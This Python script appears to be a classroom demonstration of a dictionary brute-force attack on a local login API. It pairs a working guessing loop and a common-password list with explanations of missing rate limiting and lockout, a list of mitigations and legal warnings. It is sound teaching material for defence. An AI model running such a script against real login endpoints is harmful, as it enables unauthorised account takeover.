#!/usr/bin/env python3
"""
🔓 Brute Force Attack Demonstration
Educational Cybersecurity Tool

⚠️ EDUCATIONAL PURPOSE ONLY
This script demonstrates why rate limiting and account lockout are critical.
Only use on systems you own or have explicit permission to test.

Author: For Cybersecurity TP - Phase 1
"""

import requests
import time
from datetime import datetime
import sys
from typing import List, Dict, Optional

# ANSI Colors
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    END = '\033[0m'

# Configuration
API_URL = "http://localhost:3000/api/auth/login"
TARGET_EMAIL = "student@test.com"  # Change this to your test user

# Common password list (educational - real attacks use much larger lists)
COMMON_PASSWORDS = [
    "123456",
    "password",
    "12345678",
    "qwerty",
    "123456789",
    "12345",
    "1234",
    "111111",
    "1234567",
    "dragon",
    "123123",
    "baseball",
    "abc123",
    "football",
    "monkey",
    "letmein",
    "shadow",
    "master",
    "666666",
    "qwertyuiop",
    "123321",
    "mustang",
    "1234567890",
    "michael",
    "654321",
    "superman",
    "1qaz2wsx",
    "7777777",
    "121212",
    "000000",
    # Add the actual password for demo
    "TestPassword123",  # This will be found!
]

def print_banner():
    """Print attack banner"""
    print(f"{Colors.CYAN}{Colors.BOLD}")
    print("=" * 70)
    print("🔓 BRUTE FORCE ATTACK DEMONSTRATION")
    print("=" * 70)
    print(f"{Colors.END}")
    print(f"{Colors.RED}⚠️  EDUCATIONAL PURPOSE ONLY{Colors.END}")
    print(f"{Colors.RED}⚠️  Only use on systems you own or have permission to test{Colors.END}")
    print(f"{Colors.CYAN}=" * 70)
    print(f"Target: {API_URL}")
    print(f"Email: {TARGET_EMAIL}")
    print(f"Passwords to try: {len(COMMON_PASSWORDS)}")
    print(f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"=" * 70 + f"{Colors.END}\n")

def attempt_login(email: str, password: str) -> Dict:
    """
    Attempt to login with given credentials
    
    Returns:
        dict with 'success', 'status_code', 'message', 'time_ms'
    """
    start_time = time.time()
    
    try:
        response = requests.post(
            API_URL,
            json={"email": email, "password": password},
            timeout=10
        )
        elapsed = (time.time() - start_time) * 1000  # Convert to ms
        
        if response.status_code == 200:
            return {
                "success": True,
                "status_code": 200,
                "message": "Login successful",
                "time_ms": elapsed,
                "data": response.json()
            }
        else:
            return {
                "success": False,
                "status_code": response.status_code,
                "message": response.json().get("error", "Login failed"),
                "time_ms": elapsed
            }
    
    except requests.exceptions.ConnectionError:
        print(f"{Colors.RED}Error: Cannot connect to {API_URL}")
        print(f"Make sure the backend server is running!{Colors.END}")
        sys.exit(1)
    except Exception as e:
        return {
            "success": False,
            "status_code": 0,
            "message": str(e),
            "time_ms": 0
        }

def brute_force_attack(
    email: str, 
    password_list: List[str],
    delay: float = 0.0,
    verbose: bool = True
) -> Optional[str]:
    """
    Perform brute force attack
    
    Args:
        email: Target email address
        password_list: List of passwords to try
        delay: Delay between attempts (seconds)
        verbose: Print detailed output
    
    Returns:
        Successful password or None
    """
    total_attempts = len(password_list)
    successful_password = None
    attempts_made = 0
    total_time_start = time.time()
    
    print(f"{Colors.YELLOW}Starting brute force attack...{Colors.END}\n")
    
    for i, password in enumerate(password_list, 1):
        attempts_made += 1
        
        # Attempt login
        result = attempt_login(email, password)
        
        # Display progress
        if verbose:
            status_color = Colors.GREEN if result["success"] else Colors.RED
            status_symbol = "✓" if result["success"] else "✗"
            
            print(f"[{i}/{total_attempts}] {status_color}{status_symbol}{Colors.END} "
                  f"Testing: '{password[:20]}{'...' if len(password) > 20 else ''}' "
                  f"({result['time_ms']:.0f}ms) - {result['message']}")
        
        # Check if successful
        if result["success"]:
            successful_password = password
            print(f"\n{Colors.GREEN}{Colors.BOLD}{'=' * 70}")
            print(f"🎯 PASSWORD FOUND!")
            print(f"{'=' * 70}{Colors.END}")
            print(f"{Colors.GREEN}Password: {password}{Colors.END}")
            print(f"{Colors.CYAN}Attempts: {attempts_made}/{total_attempts}{Colors.END}")
            print(f"{Colors.CYAN}Time taken: {time.time() - total_time_start:.2f} seconds{Colors.END}\n")
            break
        
        # Check for rate limiting
        if result["status_code"] == 429:
            print(f"\n{Colors.YELLOW}⚠️  Rate limiting detected!{Colors.END}")
            print(f"The server is blocking our requests.")
            print(f"This is GOOD - it's a security measure to prevent brute force attacks.\n")
            break
        
        # Delay between attempts
        if delay > 0 and i < total_attempts:
            time.sleep(delay)
    
    total_time = time.time() - total_time_start
    
    # Print summary
    print(f"\n{Colors.CYAN}{Colors.BOLD}{'=' * 70}")
    print(f"ATTACK SUMMARY")
    print(f"{'=' * 70}{Colors.END}")
    print(f"Total attempts: {attempts_made}/{total_attempts}")
    print(f"Total time: {total_time:.2f} seconds")
    print(f"Average time per attempt: {(total_time/attempts_made)*1000:.0f}ms")
    print(f"Passwords per second: {attempts_made/total_time:.2f}")
    
    if successful_password:
        print(f"{Colors.GREEN}Result: PASSWORD FOUND ✓{Colors.END}")
        print(f"{Colors.GREEN}Password: {successful_password}{Colors.END}")
    else:
        print(f"{Colors.RED}Result: Password not found ✗{Colors.END}")
    
    print(f"{Colors.CYAN}{'=' * 70}{Colors.END}\n")
    
    return successful_password

def demonstrate_vulnerability():
    """Demonstrate the brute force vulnerability"""
    print(f"{Colors.YELLOW}{Colors.BOLD}")
    print("WHY THIS ATTACK WORKS (Phase 1 Vulnerabilities):")
    print(f"{Colors.END}")
    print(f"{Colors.RED}1. No Rate Limiting:{Colors.END} Server accepts unlimited login attempts")
    print(f"{Colors.RED}2. No Account Lockout:{Colors.END} Account never gets locked after failed attempts")
    print(f"{Colors.RED}3. Fast Response:{Colors.END} Server responds quickly, allowing many attempts per second")
    print(f"{Colors.RED}4. Predictable Response:{Colors.END} Different responses for valid/invalid credentials")
    print(f"{Colors.RED}5. No CAPTCHA:{Colors.END} No human verification")
    print(f"{Colors.RED}6. No IP Blocking:{Colors.END} Same IP can make unlimited requests")
    print()

def show_mitigations():
    """Show how to prevent brute force attacks"""
    print(f"{Colors.GREEN}{Colors.BOLD}")
    print("HOW TO PREVENT BRUTE FORCE ATTACKS (Phase 2 Fixes):")
    print(f"{Colors.END}")
    print(f"{Colors.GREEN}1. Rate Limiting:{Colors.END} Limit login attempts per IP/user (e.g., 5 per 15 min)")
    print(f"{Colors.GREEN}2. Account Lockout:{Colors.END} Lock account after N failed attempts")
    print(f"{Colors.GREEN}3. Progressive Delays:{Colors.END} Increase delay after each failed attempt")
    print(f"{Colors.GREEN}4. CAPTCHA:{Colors.END} Add CAPTCHA after failed attempts")
    print(f"{Colors.GREEN}5. Two-Factor Auth:{Colors.END} Require second factor (SMS, authenticator app)")
    print(f"{Colors.GREEN}6. IP Blocking:{Colors.END} Block IPs with suspicious activity")
    print(f"{Colors.GREEN}7. Generic Errors:{Colors.END} Don't reveal if email exists")
    print(f"{Colors.GREEN}8. Monitor & Alert:{Colors.END} Alert on suspicious patterns")
    print(f"{Colors.GREEN}9. Strong Passwords:{Colors.END} Enforce password complexity")
    print(f"{Colors.GREEN}10. Breach Detection:{Colors.END} Check against known breached passwords")
    print()

def calculate_attack_time():
    """Calculate time for larger attacks"""
    print(f"{Colors.CYAN}{Colors.BOLD}")
    print("REAL-WORLD ATTACK SCENARIOS:")
    print(f"{Colors.END}")
    
    # Typical attack speeds
    attempts_per_second = 10  # Conservative estimate
    
    scenarios = [
        ("Top 100 common passwords", 100),
        ("Top 1,000 common passwords", 1_000),
        ("Top 10,000 common passwords", 10_000),
        ("Top 100,000 common passwords", 100_000),
        ("1 Million passwords (small dictionary)", 1_000_000),
        ("10 Million passwords (medium dictionary)", 10_000_000),
        ("100 Million passwords (large dictionary)", 100_000_000),
    ]
    
    print(f"Assuming {attempts_per_second} attempts/second:\n")
    
    for name, count in scenarios:
        seconds = count / attempts_per_second
        
        if seconds < 60:
            time_str = f"{seconds:.0f} seconds"
        elif seconds < 3600:
            time_str = f"{seconds/60:.1f} minutes"
        elif seconds < 86400:
            time_str = f"{seconds/3600:.1f} hours"
        else:
            time_str = f"{seconds/86400:.1f} days"
        
        print(f"  {name:45} {count:>12,} passwords = {time_str}")
    
    print(f"\n{Colors.YELLOW}⚠️  Without rate limiting, an attacker could try millions of passwords!{Colors.END}\n")

def main():
    """Main execution"""
    print_banner()
    
    # Show vulnerabilities
    demonstrate_vulnerability()
    
    # Show mitigations
    show_mitigations()
    
    # Show attack scenarios
    calculate_attack_time()
    
    # Ask for confirmation
    print(f"{Colors.YELLOW}{Colors.BOLD}Ready to start attack demonstration?{Colors.END}")
    print(f"{Colors.RED}This will attempt to login with {len(COMMON_PASSWORDS)} passwords.{Colors.END}")
    
    response = input(f"\nType 'yes' to continue: ").strip().lower()
    
    if response != 'yes':
        print(f"\n{Colors.YELLOW}Attack cancelled.{Colors.END}")
        sys.exit(0)
    
    print()
    
    # Perform attack
    try:
        password = brute_force_attack(
            email=TARGET_EMAIL,
            password_list=COMMON_PASSWORDS,
            delay=0.1,  # Small delay to be nice to the server
            verbose=True
        )
        
        if password:
            print(f"{Colors.RED}{Colors.BOLD}")
            print("🚨 VULNERABILITY CONFIRMED! 🚨")
            print(f"{Colors.END}")
            print(f"The account was compromised through brute force attack.")
            print(f"This demonstrates why Phase 1 is INSECURE.\n")
            
            print(f"{Colors.GREEN}In Phase 2, we will implement:{Colors.END}")
            print(f"  • Rate limiting to block rapid attempts")
            print(f"  • Account lockout after failed attempts")
            print(f"  • Password strength requirements")
            print(f"  • Monitoring and alerting\n")
        else:
            print(f"{Colors.YELLOW}Attack unsuccessful, but the vulnerability still exists.{Colors.END}")
            print(f"{Colors.YELLOW}Try updating TARGET_EMAIL or adding the actual password to the list.{Colors.END}\n")
    
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}Attack interrupted by user.{Colors.END}")
        sys.exit(0)

if __name__ == "__main__":
    # Check if requests is installed
    try:
        import requests
    except ImportError:
        print(f"{Colors.RED}Error: 'requests' module not found{Colors.END}")
        print("Install it with: pip install requests")
        sys.exit(1)
    
    # Warning
    print(f"{Colors.RED}{Colors.BOLD}")
    print("=" * 70)
    print("⚠️  LEGAL WARNING ⚠️")
    print("=" * 70)
    print(f"{Colors.END}")
    print("This tool is for EDUCATIONAL PURPOSES ONLY.")
    print("Only use on systems you OWN or have EXPLICIT PERMISSION to test.")
    print("Unauthorized access is ILLEGAL and can result in:")
    print("  • Criminal prosecution")
    print("  • Civil lawsuits")
    print("  • Academic expulsion")
    print("  • Career damage")
    print()
    print("By continuing, you acknowledge this is for educational use only.")
    print(f"{Colors.RED}{'=' * 70}{Colors.END}\n")
    
    confirm = input("Type 'I UNDERSTAND' to continue: ").strip()
    
    if confirm != "I UNDERSTAND":
        print(f"\n{Colors.YELLOW}Exiting. Good choice to be cautious!{Colors.END}")
        sys.exit(0)
    
    print()
    main()

